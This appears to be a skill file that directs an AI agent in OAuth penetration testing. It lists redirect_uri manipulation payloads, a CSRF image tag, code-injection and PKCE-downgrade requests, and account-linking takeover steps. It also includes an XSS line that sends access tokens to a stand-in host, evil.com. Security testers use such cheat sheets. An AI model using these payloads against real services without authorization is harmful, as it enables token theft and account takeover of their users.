# OAuth Attacks Skill

## Goal

Identify and exploit OAuth/OAuth2 vulnerabilities to steal access tokens or perform account takeover.

## Methodology

1. **Map OAuth Flow:** Identify authorization endpoints, redirect URIs, and token handling
2. **Test Redirect URI Validation:** Check for open redirect or insufficient validation
3. **Test State Parameter:** Check for CSRF in OAuth flow
4. **Exploit Token Leakage:** Find ways to steal authorization codes or access tokens
5. **Account Takeover:** Chain vulnerabilities for full account access

## OAuth Flow Overview

```
1. User clicks "Login with Provider"
2. Redirect to: /authorize?client_id=X&redirect_uri=Y&response_type=code&state=Z
3. User authenticates with provider
4. Redirect to: Y?code=AUTH_CODE&state=Z
5. App exchanges code for access_token
```

## Redirect URI Manipulation

```bash
# Open redirect via subdomain
redirect_uri=https://evil.target.com/callback

# Path traversal
redirect_uri=https://target.com/callback/../../../evil

# Parameter pollution
redirect_uri=https://target.com/callback&redirect_uri=https://evil.com

# Fragment injection
redirect_uri=https://target.com/callback#@evil.com

# Localhost bypass
redirect_uri=https://127.0.0.1/callback
redirect_uri=https://target.com@evil.com
```

## Token Leakage via Referer

```html
<!-- If redirect page has external links, token may leak in Referer -->
<!-- Exploit: Register redirect_uri to page with external resources -->
<img src="https://evil.com/log">
<!-- Token in URL fragment leaks via Referer -->
```

## Missing State Parameter (CSRF)

```html
<!-- Force victim to complete OAuth with attacker's account -->
<img src="https://target.com/oauth/callback?code=ATTACKER_CODE">
```

## Authorization Code Injection

```bash
# If code is not tied to client, use stolen code with legitimate app
POST /oauth/token
code=STOLEN_CODE&client_id=LEGIT_APP&redirect_uri=...
```

## Implicit Grant Attacks

```bash
# Token in URL fragment accessible to JavaScript
https://target.com/callback#access_token=xyz

# XSS can steal fragment
<script>location='https://evil.com/?token='+location.hash</script>
```

## PKCE Bypass

```bash
# Downgrade attack - omit code_verifier if server doesn't enforce
POST /oauth/token
code=X&client_id=Y
# (no code_verifier)
```

## Account Linking Flaws

```bash
# If email verification not required:
1. Create account with victim@example.com
2. Link OAuth provider
3. Victim signs up with same email via different method
4. Attacker can access victim's account via OAuth
```

## Scope Manipulation

```bash
# Request more scopes than intended
authorize?scope=read+write+admin

# Upgrade token scope post-authorization
```

## Tools

* **Burp Suite** - Intercept OAuth flows
* **OAuth Tester** - Automated OAuth testing
* **Browser DevTools** - Monitor redirects and tokens

## Guidance for AI

* Activate when testing OAuth/OpenID Connect implementations
* Check redirect_uri validation thoroughly - try subdomains, paths, parameters
* Missing or predictable state parameter allows CSRF attacks
* Implicit grant is inherently less secure than authorization code
* Check if PKCE is enforced for public clients
* Token leakage via Referer header is common
* Test account linking between OAuth and traditional auth
